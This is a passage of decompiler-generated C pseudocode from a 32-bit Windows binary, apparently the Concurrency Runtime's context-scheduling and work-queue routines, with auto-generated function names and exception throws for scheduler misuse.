        sub_43EAA5((int)v7, *(_DWORD *)(v13 + 24), 0, 0);
      sub_43EEF1(v13 - 4, (int)v7, 1);
    }
    else if ( v7 )
    {
      if ( v15 )
      {
        sub_437280(*(_DWORD *)(v13 + 28), v7, 1);
      }
      else
      {
        if ( v14 )
        {
          Next = v7[42].Next;
          UserMathErrorFunction();
          sub_4419A3(Next, (int)&v7[1]);
          UserMathErrorFunction();
        }
        v9 = v7->Next[5].Next;
        v10 = sub_41DA9B(&v7[1].Next);
        sub_4380FD(v12, (_DWORD *)(v10 + 12));
        ((void (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int, int, int, int))v9)(v7, v12[0], v12[1], v12[2], v12[3]);
      }
    }
  }
  return UserMathErrorFunction();
}

//----- (0043E280) --------------------------------------------------------
char __thiscall sub_43E280(int this)
{
  __int32 v2; // ecx
  LPVOID v3; // eax
  LPVOID v4; // esi
  __int32 v6[2]; // [esp+8h] [ebp-8h] BYREF

  if ( *(_DWORD *)(this + 160) )
  {
    *(_BYTE *)(this + 176) = 1;
    v2 = *(_DWORD *)(this + 160);
    v6[0] = 0;
    LOBYTE(v3) = sub_43CBAD(v2, v6, 15, 1);
    if ( (_BYTE)v3 )
      LOBYTE(v3) = sub_43CCA4((_DWORD **)v6[1], v6[0], 0, 0);
  }
  else
  {
    v4 = (LPVOID)(this + 4);
    v3 = sub_4359BC();
    if ( v3 == v4 )
    {
      *(_BYTE *)(this + 176) = 1;
    }
    else
    {
      sub_43EC56((_DWORD *)this);
      sub_43E2F2((_DWORD *)this);
      LOBYTE(v3) = sub_43588D(*(_DWORD *)(this + 32));
    }
  }
  return (char)v3;
}

//----- (0043E2F2) --------------------------------------------------------
void __thiscall sub_43E2F2(_DWORD *this)
{
  sub_4387A1((int)(this + 1));
  sub_43ED6F(this, 0, 0);
}

//----- (0043E30A) --------------------------------------------------------
int __thiscall sub_43E30A(_DWORD *this)
{
  UserMathErrorFunction();
  sub_43E2F2(this);
  return sub_43588D(this[8]);
}

//----- (0043E325) --------------------------------------------------------
BOOL __thiscall sub_43E325(int this, int a2)
{
  _DWORD *v3; // eax
  int v4; // eax
  char v5; // al
  char pExceptionObject[12]; // [esp+10h] [ebp-30h] BYREF
  int v8[2]; // [esp+1Ch] [ebp-24h] BYREF
  int v9; // [esp+24h] [ebp-1Ch]
  void *v10; // [esp+28h] [ebp-18h] BYREF
  int v11; // [esp+2Ch] [ebp-14h]
  char v12; // [esp+32h] [ebp-Eh]
  char v13; // [esp+33h] [ebp-Dh]
  int v14; // [esp+3Ch] [ebp-4h]

  v11 = 0;
  v12 = 0;
  *(_DWORD *)(this + 72) = GetCurrentThreadId();
  sub_438F82((LPVOID)(this + 4));
  v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD, void **))(**(_DWORD **)(this + 32) + 12))(*(_DWORD *)(this + 32), &v10);
  v14 = 0;
  v11 = 1;
  if ( sub_43A2A8(v3, 9u) || (v4 = sub_43268A(), v13 = 1, v4 != 6) )
    v13 = 0;
  v14 = -1;
  sub_43A283(&v10);
  if ( v13 )
  {
    v12 = 1;
    sub_43C00E(1);
  }
  UserMathErrorFunction();
  *(_DWORD *)(this + 172) = 0;
  v13 = 0;
  if ( !sub_43E4F3(this) )
    goto LABEL_8;
LABEL_7:
  v5 = sub_43E8BC(this);
  v13 = v5;
  while ( !v5 )
  {
LABEL_8:
    *(_BYTE *)(this + 179) &= ~2u;
    v8[0] = 0;
    v9 = 0;
    if ( !*(_DWORD *)(this + 160) )
    {
      UserMathErrorFunction();
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVnested_scheduler_missing_detach_Concurrency__);
    }
    if ( !*(_BYTE *)(this + 178) && sub_43D393(*(_DWORD *)(this + 160)) )
    {
      UserMathErrorFunction();
      sub_435669(*(_DWORD **)(this + 32));
      UserMathErrorFunction();
    }
    if ( sub_43F200(this, (int)v8) )
    {
      if ( v8[0] != 1 )
      {
        sub_43E4B6((int *)this, v8);
        goto LABEL_7;
      }
      sub_43EEF1(this, v9, 0);
      break;
    }
    if ( sub_43E8BC(this) )
      break;
    sub_43F100((_DWORD *)this);
    if ( *(_BYTE *)(this + 176) )
    {
      sub_43E30A((_DWORD *)this);
      break;
    }
    v5 = v13;
  }
  if ( v12 )
    sub_43C030();
  return sub_43881B();
}
// 43268A: using guessed type int sub_43268A(void);

//----- (0043E4B6) --------------------------------------------------------
char __thiscall sub_43E4B6(int *this, _DWORD *a2)
{
  sub_443A95(a2, this);
  ++*(_DWORD *)(this[40] + 108);
  UserMathErrorFunction();
  sub_442AB7(a2);
  UserMathErrorFunction();
  return sub_438D74(this + 1);
}

//----- (0043E4F3) --------------------------------------------------------
char __thiscall sub_43E4F3(int this)
{
  int v2; // esi
  int v3; // ecx

  if ( !*(_DWORD *)(this + 168) )
    return 0;
  UserMathErrorFunction();
  v2 = *(_DWORD *)(this + 168);
  if ( *(_BYTE *)(this + 177) )
  {
    (*(void (__thiscall **)(_DWORD, _DWORD))(v2 + 12))(*(_DWORD *)(v2 + 12), *(_DWORD *)(this + 168));
    *(_DWORD *)(this + 168) = 0;
  }
  else
  {
    sub_443AE2(*(_DWORD *)(this + 168));
    v3 = *(_DWORD *)(this + 32);
    *(_DWORD *)(this + 168) = 0;
    sub_4372CA(v3, v2);
  }
  UserMathErrorFunction();
  sub_438D74((int *)(this + 4));
  return 1;
}

//----- (0043E561) --------------------------------------------------------
int __thiscall sub_43E561(_DWORD *this, bool *a2, bool *a3)
{
  int v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ebx
  int v7; // [esp-Ch] [ebp-28h]
  int v8[2]; // [esp+Ch] [ebp-10h] BYREF
  int v9; // [esp+14h] [ebp-8h]
  _DWORD *v10; // [esp+18h] [ebp-4h]

  v10 = this;
  v4 = this[40];
  v7 = this[7];
  v8[0] = 0;
  v9 = 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int, int *, int, _DWORD, int))(v4 + 72))(v4 + 40, v8, v7, 0, 25) )
  {
    v5 = (struct _SINGLE_LIST_ENTRY *)sub_43600C(this[8], 1);
    *a2 = v5 != 0;
    return (int)v5;
  }
  if ( v8[0] == 1 )
    return v9;
  UserMathErrorFunction();
  v5 = (struct _SINGLE_LIST_ENTRY *)sub_43600C(this[8], 1);
  UserMathErrorFunction();
  if ( !v5 )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int, int *, _DWORD, _DWORD, int))(v10[40] + 72))(
            v10[40] + 40,
            v8,
            v10[7],
            0,
            1) )
      return (int)v5;
    return sub_442634(v8);
  }
  if ( !sub_442CA4(v8) )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int, int *, _DWORD, _DWORD, int))(v10[40] + 72))(
            v10[40] + 40,
            v8,
            v10[7],
            0,
            7) )
    {
      *a2 = 1;
      return (int)v5;
    }
    if ( v8[0] == 1 )
    {
      sub_437280(v10[8], v5, 1);
      return sub_442634(v8);
    }
  }
  *a3 = v8[0] == 4;
  sub_442681(v8, (int)v5);
  return (int)v5;
}

//----- (0043E68B) --------------------------------------------------------
int __thiscall sub_43E68B(_DWORD **this, int a2)
{
  int *v3; // eax

  UserMathErrorFunction();
  v3 = (int *)sub_43CD60(this[39]);
  sub_43DD27(v3, a2);
  return UserMathErrorFunction();
}

//----- (0043E6B7) --------------------------------------------------------
signed __int32 __thiscall sub_43E6B7(volatile signed __int32 *this, signed __int32 a2)
{
  int v2; // esi

  v2 = 0;
  if ( a2 && a2 == *((_DWORD *)this + 41) && _InterlockedCompareExchange(this + 41, 0, a2) == a2 )
    return a2;
  return v2;
}

//----- (0043E6E5) --------------------------------------------------------
int __thiscall sub_43E6E5(_DWORD *this)
{
  return sub_408AB6(this - 1);
}

//----- (0043E6ED) --------------------------------------------------------
int __thiscall sub_43E6ED(_DWORD *this)
{
  return this[39];
}

//----- (0043E6F4) --------------------------------------------------------
int __thiscall sub_43E6F4(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[8] + 52))(this[8]);
}

//----- (0043E70D) --------------------------------------------------------
int __thiscall sub_43E70D(_DWORD *this)
{
  int v2; // edi

  UserMathErrorFunction();
  if ( this[39] )
    v2 = *(_DWORD *)(this[39] + 136);
  else
    v2 = -1;
  UserMathErrorFunction();
  return v2;
}

//----- (0043E73C) --------------------------------------------------------
void __thiscall sub_43E73C(int *this, int a2, int a3, int a4)
{
  int *v4; // edi
  _DWORD *v5; // eax
  volatile __int32 *v6; // esi
  int v7; // edx
  int v8; // eax
  int v9; // ebx
  int v10; // ecx
  int v11; // edx
  unsigned int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  void *v16; // [esp+10h] [ebp-30h]
  void *Block; // [esp+14h] [ebp-2Ch]
  unsigned int v19; // [esp+20h] [ebp-20h]
  _DWORD *v20; // [esp+24h] [ebp-1Ch]
  int v21; // [esp+28h] [ebp-18h]
  int v22; // [esp+2Ch] [ebp-14h]
  int v23; // [esp+30h] [ebp-10h]

  v4 = this;
  v19 = 2 * this[2] + 2;
  v21 = unknown_libname_45((unsigned __int64)v19 >> 30 != 0 ? -1 : 4 * v19);
  Block = (void *)v4[3];
  v5 = (_DWORD *)unknown_libname_45((unsigned __int64)v19 >> 29 != 0 ? -1 : 8 * v19);
  v20 = v5;
  if ( v5 )
    `vector constructor iterator'(v5, 8u, v19, unknown_libname_50);
  else
    v20 = 0;
  v6 = (volatile __int32 *)v4[5];
  v16 = (void *)v4[4];
  sub_4304D3(v6);
  v7 = 0;
  v8 = *v4;
  v9 = v4[1] - *v4;
  v22 = *v4;
  v23 = 0;
  if ( v9 > 0 )
  {
    do
    {
      *(_DWORD *)(v21 + 4 * v7) = *(_DWORD *)(v4[3] + 4 * (v4[2] & v8));
      v10 = v4[4];
      v11 = v4[2] & v22;
      v20[2 * v23] = *(_DWORD *)(v10 + 8 * v11);
      v4 = this;
      v20[2 * v23 + 1] = *(_DWORD *)(v10 + 8 * v11 + 4);
      v7 = v23 + 1;
      v8 = v22 + 1;
      v23 = v7;
      ++v22;
    }
    while ( v7 < v9 );
  }
  memset((void *)(v21 + 4 * v9), 0, 4 * (v19 - v9));
  v4[3] = v21;
  v12 = v19 - 1;
  v4[4] = (int)v20;
  *v4 = 0;
  v4[2] = v19 - 1;
  if ( a3 )
  {
    v13 = v4[4];
    v14 = v9 & v12;
    *(_DWORD *)(v13 + 8 * v14) = a3;
    *(_DWORD *)(v13 + 8 * v14 + 4) = a4;
    v12 = v4[2];
    v15 = a2 | 1;
  }
  else
  {
    v15 = a2;
  }
  *(_DWORD *)(v4[3] + 4 * (v9 & v12)) = v15;
  v4[1] = v9 + 1;
  sub_430514(v6);
  j_j_j___free_base(Block);
  j_j_j___free_base(v16);
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043E8B4) --------------------------------------------------------
bool __thiscall sub_43E8B4(_DWORD *this)
{
  return this[11] == 2;
}

//----- (0043E8BC) --------------------------------------------------------
char __thiscall sub_43E8BC(int this)
{
  if ( *(_BYTE *)(this + 178) || !*(_BYTE *)(*(_DWORD *)(this + 160) + 173) )
    return 0;
  if ( *(_DWORD *)(this + 172) )
    sub_43CF11((_DWORD *)(*(_DWORD *)(this + 32) + 60), *(_DWORD *)(*(_DWORD *)(this + 160) + 144));
  *(_DWORD *)(this + 172) = 0;
  if ( sub_43EDBA((struct _SINGLE_LIST_ENTRY *)this, 0) )
    sub_43E30A((_DWORD *)this);
  return 1;
}

//----- (0043E91A) --------------------------------------------------------
int __thiscall sub_43E91A(int this)
{
  int v2; // eax
  int v3; // esi
  int v4; // ecx
  int v6; // [esp+Ch] [ebp-18h]
  int v7; // [esp+10h] [ebp-14h]
  int v8; // [esp+14h] [ebp-10h]
  int v9; // [esp+18h] [ebp-Ch]
  int v10; // [esp+1Ch] [ebp-8h]
  bool v11; // [esp+22h] [ebp-2h] BYREF
  bool v12; // [esp+23h] [ebp-1h] BYREF

  UserMathErrorFunction();
  v12 = 0;
  v11 = 0;
  v2 = sub_43E561((_DWORD *)this, &v12, &v11);
  v3 = v2;
  v7 = v2;
  if ( v12 )
    sub_43EAA5(v2, *(_DWORD *)(this + 28), 0, 0);
  UserMathErrorFunction();
  v4 = *(_DWORD *)(this + 160);
  v6 = *(_DWORD *)(this + 32);
  *(_DWORD *)(this + 160) = 0;
  v10 = v4;
  v8 = *(_DWORD *)(this + 156);
  v9 = v3;
  if ( !v3 )
    v9 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
  (*(void (__fastcall **)(int, __int32, int))(*(_DWORD *)v10 + 16))(
    v10,
    _InterlockedExchange((volatile __int32 *)(this + 44), 1),
    v7);
  if ( v9 )
  {
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v8 + 4))(v8, v9, 2);
  }
  else
  {
    sub_43CF95(v10, 4, 1);
    sub_4358A6(v6);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v8 + 8))(v8, 2);
  }
  UserMathErrorFunction();
  return UserMathErrorFunction();
}

//----- (0043EA1F) --------------------------------------------------------
char __thiscall sub_43EA1F(int this, char a2)
{
  int v3; // eax
  _BYTE *v4; // eax
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  v3 = *(_DWORD *)(this + 20);
  if ( a2 )
  {
    v4 = (_BYTE *)(v3 + 1);
    *(_DWORD *)(this + 20) = v4;
    if ( v4 == (_BYTE *)1 )
    {
      UserMathErrorFunction();
      (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 156) + 32))(*(_DWORD *)(this + 156));
      LOBYTE(v4) = UserMathErrorFunction();
    }
  }
  else
  {
    if ( !v3 )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_oversubscribe_operation_Concurrency__);
    }
    v4 = (_BYTE *)(v3 - 1);
    *(_DWORD *)(this + 20) = v4;
    if ( !v4 )
    {
      v4 = (_BYTE *)sub_43E6B7((volatile signed __int32 *)(this - 4), *(_DWORD *)(this + 160));
      if ( v4 )
        LOBYTE(v4) = sub_43D005(v4);
    }
  }
  return (char)v4;
}

//----- (0043EAA5) --------------------------------------------------------
int __thiscall sub_43EAA5(int this, int a2, int a3, char a4)
{
  int result; // eax
  char v5; // dl

  result = a2;
  v5 = 0;
  *(_BYTE *)(this + 236) = 0;
  *(_DWORD *)(this + 28) = a2;
  if ( a3 )
  {
    if ( a4 )
    {
      result = *(_DWORD *)(a2 + 256);
      if ( (*(_BYTE *)(result + 48) & 4) == 0 )
        _InterlockedIncrement((volatile signed __int32 *)(result + 20));
      v5 = 1;
    }
    *(_BYTE *)(this + 177) = v5;
    *(_DWORD *)(this + 168) = a3;
  }
  else
  {
    result = *(_DWORD *)(a2 + 256);
    if ( (*(_BYTE *)(result + 48) & 4) == 0 )
      _InterlockedIncrement((volatile signed __int32 *)(result + 20));
  }
  return result;
}

//----- (0043EAF8) --------------------------------------------------------
int __thiscall sub_43EAF8(int this, int a2)
{
  int result; // eax

  *(_DWORD *)(this + 160) = a2;
  result = this + 44;
  _InterlockedExchange((volatile __int32 *)(this + 44), 0);
  return result;
}

//----- (0043EB0F) --------------------------------------------------------
void __thiscall sub_43EB0F(int *this, int a2)
{
  int v2; // edi
  int v3; // esi

  v2 = this[1];
  v3 = this[2];
  if ( v2 >= v3 + *this )
  {
    sub_43E73C(this, a2, 0, 0);
  }
  else
  {
    *(_DWORD *)(this[3] + 4 * (v2 & v3)) = a2;
    this[1] = v2 + 1;
  }
}

//----- (0043EB50) --------------------------------------------------------
void __thiscall sub_43EB50(_DWORD *this)
{
  __int32 v2; // ecx
  __int32 v3; // [esp+4h] [ebp-8h] BYREF

  if ( *((_BYTE *)this + 178) )
  {
    v2 = this[40];
    v3 = 0;
    if ( !sub_43CBAD(v2, &v3, 15, 1) && !(unsigned __int8)sub_43CC60((_DWORD **)this[40], (int)this) )
    {
      do
        (*(void (__thiscall **)(_DWORD *))(*this + 32))(this);
      while ( !(unsigned __int8)sub_43CC60((_DWORD **)this[40], (int)this) );
    }
    *((_BYTE *)this + 178) = 0;
  }
}

//----- (0043EBB9) --------------------------------------------------------
int __thiscall sub_43EBB9(struct _SINGLE_LIST_ENTRY *this)
{
  UserMathErrorFunction();
  sub_43EDBA(this, 3);
  return UserMathErrorFunction();
}

//----- (0043EBD8) --------------------------------------------------------
void __thiscall sub_43EBD8(int this)
{
  sub_438D74((int *)(this + 4));
  sub_43ED6F((_DWORD *)this, 0, 0);
  *(_DWORD *)(this + 72) = 0;
  *(_BYTE *)(this + 236) = 1;
}

//----- (0043EBFB) --------------------------------------------------------
int __thiscall sub_43EBFB(int (__thiscall **this)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a2, int a3, int a4)
{
  return this[18](this + 10, a2, a3, a4, 7);
}

//----- (0043EC23) --------------------------------------------------------
int __thiscall sub_43EC23(_DWORD *this, int a2)
{
  int result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  result = a2;
  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pThreadProxy");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  this[39] = a2;
  return result;
}

//----- (0043EC56) --------------------------------------------------------
char __thiscall sub_43EC56(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  if ( !this[11] )
  {
    v4 = 0;
    v5 = sub_43051F;
    do
      result = sub_42E8F5((int)v3);
    while ( !this[11] );
  }
  return result;
}
// 43EC56: using guessed type char var_10[8];

//----- (0043EC81) --------------------------------------------------------
char __cdecl sub_43EC81(_DWORD *a1, int a2)
{
  char result; // al
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  if ( *a1 != a2 )
  {
    v4 = 0;
    v5 = sub_43051F;
    do
      result = sub_42E8F5((int)v3);
    while ( *a1 != a2 );
  }
  return result;
}
// 43EC81: using guessed type char var_10[8];

//----- (0043ECAE) --------------------------------------------------------
int __thiscall sub_43ECAE(int this)
{
  int v2; // ebx
  int v3; // eax
  int v4; // ebx
  int v5; // esi
  int result; // eax
  int v7; // [esp-Ch] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-24h]
  int v9; // [esp+Ch] [ebp-14h] BYREF
  int v10; // [esp+14h] [ebp-Ch]
  int v11; // [esp+18h] [ebp-8h]
  int v12; // [esp+1Ch] [ebp-4h]

  v12 = 0;
  v11 = this;
  UserMathErrorFunction();
  v2 = *(_DWORD *)(this + 8);
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  v8 = v2;
  v4 = v11;
  sub_43914D(5, 4u, v3, v8);
  if ( *(_BYTE *)(*(_DWORD *)(v11 + 156) + 173) )
  {
    sub_43EDBA((struct _SINGLE_LIST_ENTRY *)(v11 - 4), 2);
  }
  else
  {
    v5 = *(_DWORD *)(v11 + 156);
    v7 = *(_DWORD *)(v11 + 24);
    v9 = 0;
    v10 = 0;
    if ( (*(unsigned __int8 (__thiscall **)(int, int *, int, _DWORD, int))(v5 + 72))(v5 + 40, &v9, v7, 0, 1) )
      sub_43EEF1(v4 - 4, v10, 2);
    else
      LOBYTE(v12) = 1;
  }
  result = UserMathErrorFunction();
  if ( (_BYTE)v12 )
    return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v4 + 152) + 12))(*(_DWORD *)(v4 + 152));
  return result;
}

//----- (0043ED6F) --------------------------------------------------------
void __thiscall sub_43ED6F(_DWORD *this, int a2, char a3)
{
  int v4; // eax

  if ( this[7] )
  {
    sub_43EC81(this + 57, 0);
    sub_436AC6(*(void **)(this[7] + 256));
    if ( a3 )
    {
      v4 = *(_DWORD *)(a2 + 256);
      if ( (*(_BYTE *)(v4 + 48) & 4) == 0 )
        _InterlockedIncrement((volatile signed __int32 *)(v4 + 20));
    }
    this[7] = a2;
  }
}

//----- (0043EDBA) --------------------------------------------------------
char __thiscall sub_43EDBA(struct _SINGLE_LIST_ENTRY *this, int a2)
{
  struct _SINGLE_LIST_ENTRY *v2; // ebx
  int v3; // eax
  volatile __int32 *v4; // esi
  int v5; // ebx
  int v6; // eax
  struct _SINGLE_LIST_ENTRY *v7; // esi
  int v9[7]; // [esp-10h] [ebp-2Ch] BYREF
  struct _SINGLE_LIST_ENTRY *Next; // [esp+Ch] [ebp-10h]
  struct _SINGLE_LIST_ENTRY *v11; // [esp+10h] [ebp-Ch] BYREF
  struct _SINGLE_LIST_ENTRY *v12; // [esp+14h] [ebp-8h]
  struct _SINGLE_LIST_ENTRY *v13; // [esp+18h] [ebp-4h]

  v2 = this;
  Next = this[39].Next;
  v3 = 0;
  v12 = this;
  v13 = 0;
  if ( !this[40].Next )
    goto LABEL_15;
  sub_43EB50(this);
  v11 = v2[40].Next[48].Next;
  v13 = v2 + 1;
  UserMathErrorFunction();
  ((void (__thiscall *)(struct _SINGLE_LIST_ENTRY *))v2[40].Next->Next[3].Next)(v2[40].Next);
  v4 = (volatile __int32 *)&v2[11];
  v2[40].Next = 0;
  if ( a2 )
  {
    UserMathErrorFunction();
    _InterlockedExchange(v4, 1);
  }
  else
  {
    v5 = (int)v2[3].Next;
    v6 = ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *))v12[8].Next->Next[1].Next)(v12[8].Next);
    sub_43914D(6, 4u, v6, v5);
    v2 = v12;
    sub_440546(&v12[7].Next->Next, v12);
    v4 = (volatile __int32 *)&v12[11];
  }
  sub_437EC0((int)v2[8].Next, &v11);
  sub_437F9D((volatile signed __int32 *)v2[8].Next, 0);
  LOBYTE(v3) = v2[44].Next;
  v13 = (struct _SINGLE_LIST_ENTRY *)v3;
  if ( a2 )
  {
LABEL_15:
    if ( a2 == 2 || (v13 = (struct _SINGLE_LIST_ENTRY *)v3, a2 == 3) )
    {
      v7 = v2[7].Next;
      sub_4380FD(v9, &v7[3].Next);
      sub_43FD72(v7, (int)v2, v9[0], v9[1], v9[2], v9[3]);
    }
    if ( a2 )
      ((void (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int))Next->Next[2].Next)(Next, 1);
  }
  else
  {
    _InterlockedExchange(v4, 1);
  }
  return (char)v13;
}
// 43EE9B: variable 'v3' is possibly undefined

//----- (0043EEF1) --------------------------------------------------------
int __thiscall sub_43EEF1(int this, int a2, int a3)
{
  int v3; // edi
  _DWORD *v4; // esi
  int v5; // ebx
  int v6; // eax
  int v7; // eax
  int v8; // ebx
  __int32 v9; // edx
  int v10; // ecx
  int v11; // edi
  int result; // eax
  int v13[3]; // [esp-10h] [ebp-30h] BYREF
  int v14; // [esp-4h] [ebp-24h]
  int v15; // [esp+Ch] [ebp-14h]
  int v16; // [esp+10h] [ebp-10h]
  int v17; // [esp+14h] [ebp-Ch]
  int v18; // [esp+18h] [ebp-8h]
  int v19; // [esp+1Ch] [ebp-4h]

  v19 = 1;
  v3 = this;
  v17 = this;
  if ( a3 )
  {
    if ( a3 != 1 )
    {
      if ( a3 == 2 )
      {
        v4 = *(_DWORD **)(this + 28);
        sub_4380FD(v13, v4 + 3);
        sub_43FD72(v4, v3, v13[0], v13[1], v13[2], v14);
      }
      else if ( a3 == 3 )
      {
        v19 = 2;
      }
    }
  }
  else
  {
    v5 = *(_DWORD *)(this + 12);
    v6 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 32) + 4))(*(_DWORD *)(this + 32));
    v3 = v17;
    sub_43914D(6, 4u, v6, v5);
    sub_440546(*(_DWORD **)(v3 + 28), (struct _SINGLE_LIST_ENTRY *)v3);
    v19 = 0;
  }
  v15 = v3 + 4;
  UserMathErrorFunction();
  v7 = *(_DWORD *)(v3 + 160);
  v16 = *(_DWORD *)(v3 + 32);
  *(_DWORD *)(v3 + 160) = 0;
  v8 = *(_DWORD *)(v3 + 156);
  v18 = v7;
  v17 = a2;
  if ( !a2 )
  {
    v17 = (*(int (__thiscall **)(int))(*(_DWORD *)v7 + 4))(v18);
    v7 = v18;
  }
  v9 = _InterlockedExchange((volatile __int32 *)(v3 + 44), 1);
  v10 = *(_DWORD *)v7;
  v14 = a2;
  v11 = v18;
  (*(void (__fastcall **)(int, __int32, int))(v10 + 16))(v18, v9, a2);
  if ( v17 )
  {
    result = (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v8 + 4))(v8, v17, v19);
  }
  else
  {
    sub_43CF95(v11, 4, 1);
    sub_4358A6(v16);
    result = (*(int (__thiscall **)(int, int))(*(_DWORD *)v8 + 8))(v8, v19);
  }
  if ( a3 )
    return UserMathErrorFunction();
  return result;
}

//----- (0043F03D) --------------------------------------------------------
int __fastcall sub_43F03D(int a1)
{
  signed __int32 v2; // eax
  int v3; // edi
  _ThrowInfo *v4; // ebx
  int v5; // eax
  int v6; // ebx
  int (__thiscall *v7)(int, int, int, int, _ThrowInfo *); // esi
  int result; // eax
  int v9[3]; // [esp-10h] [ebp-30h] BYREF
  _ThrowInfo *v10; // [esp-4h] [ebp-24h]
  char pExceptionObject[12]; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+18h] [ebp-8h]
  int v13; // [esp+1Ch] [ebp-4h]

  v13 = a1;
  if ( (LPVOID)(a1 != 4 ? a1 : 0) == sub_4359BC() )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    v10 = (_ThrowInfo *)&_TI2_AVcontext_self_unblock_Concurrency__;
    goto LABEL_8;
  }
  v2 = _InterlockedDecrement((volatile signed __int32 *)(a1 + 44));
  v3 = *(_DWORD *)(a1 + 28);
  v4 = *(_ThrowInfo **)(a1 + 8);
  v12 = v2;
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v10 = v4;
  v6 = v13;
  sub_43914D(4, 4u, v5, (int)v10);
  if ( v12 == 1 )
  {
    *(_DWORD *)(v13 + 44) = 0;
    sub_43EC56((_DWORD *)(v6 - 4));
    v7 = *(int (__thiscall **)(int, int, int, int, _ThrowInfo *))(*(_DWORD *)(v6 - 4) + 20);
    sub_4380FD(v9, (_DWORD *)(*(_DWORD *)(v6 + 24) + 12));
    return v7(v6 - 4, v9[0], v9[1], v9[2], v10);
  }
  result = v12 + 1;
  if ( v12 != -1 && v12 != 0 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    v10 = (_ThrowInfo *)&_TI2_AVcontext_unblock_unbalanced_Concurrency__;
LABEL_8:
    _CxxThrowException(pExceptionObject, v10);
  }
  return result;
}
// 4899C4: using guessed type __TI_flags _TI2_AVcontext_self_unblock_Concurrency__;

//----- (0043F100) --------------------------------------------------------
int __thiscall sub_43F100(_DWORD *this)
{
  unsigned int v2; // eax
  _DWORD *v3; // edi
  unsigned int v4; // esi
  int v5; // ecx
  int result; // eax
  bool v7; // zf

  v2 = ++this[43];
  if ( v2 == 1 )
  {
    v3 = (_DWORD *)this[8];
    v4 = *(_DWORD *)(this[40] + 144);
    sub_43CF51(v3 + 15, v4);
    sub_43CC3B(v3, v4);
    v2 = this[43];
  }
  if ( v2 < 0x100 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[39] + 12))(this[39]);
  if ( v2 == 256 )
  {
    v5 = this[40];
    *((_BYTE *)this + 178) = 1;
    sub_43CF95(v5, 2, 1);
    return sub_43CC82((_DWORD **)this[40], (int)this);
  }
  if ( (*((_BYTE *)this + 179) & 2) != 0 )
  {
    this[43] = v2 - 1;
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[39] + 12))(this[39]);
  }
  sub_438051(this[8], 1);
  while ( !(unsigned __int8)sub_43CC60((_DWORD **)this[40], (int)this) )
    (*(void (__thiscall **)(_DWORD *))(*this + 32))(this);
  result = sub_438051(this[8], 0);
  v7 = this[43] == 0;
  *((_BYTE *)this + 178) = 0;
  if ( !v7 )
    result = sub_43CF11((_DWORD *)(this[8] + 60), *(_DWORD *)(this[40] + 144));
  this[43] = 0;
  return result;
}

//----- (0043F200) --------------------------------------------------------
char __thiscall sub_43F200(int this, int a2)
{
  if ( !(unsigned __int8)sub_43EBFB(
                           *(int (__thiscall ***)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(this + 160),
                           a2,
                           *(_DWORD *)(this + 28),
                           *(unsigned __int8 *)(this + 178)) )
    return 0;
  sub_43EB50((_DWORD *)this);
  if ( *(_DWORD *)(this + 172) )
    sub_43CF11((_DWORD *)(*(_DWORD *)(this + 32) + 60), *(_DWORD *)(*(_DWORD *)(this + 160) + 144));
  *(_DWORD *)(this + 172) = 0;
  return 1;
}

//----- (0043F25C) --------------------------------------------------------
int __thiscall sub_43F25C(struct _SINGLE_LIST_ENTRY *this)
{
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int v3; // eax
  struct _SINGLE_LIST_ENTRY *v4; // ebx
  struct _SINGLE_LIST_ENTRY *v5; // esi
  struct _SINGLE_LIST_ENTRY *v6; // esi
  int result; // eax
  struct _SINGLE_LIST_ENTRY *v8; // [esp-Ch] [ebp-2Ch]
  int v9; // [esp-4h] [ebp-24h]
  int v10[2]; // [esp+Ch] [ebp-14h] BYREF
  struct _SINGLE_LIST_ENTRY *v11; // [esp+14h] [ebp-Ch]
  int v12; // [esp+18h] [ebp-8h]
  struct _SINGLE_LIST_ENTRY *v13; // [esp+1Ch] [ebp-4h]

  v12 = 0;
  v13 = this;
  UserMathErrorFunction();
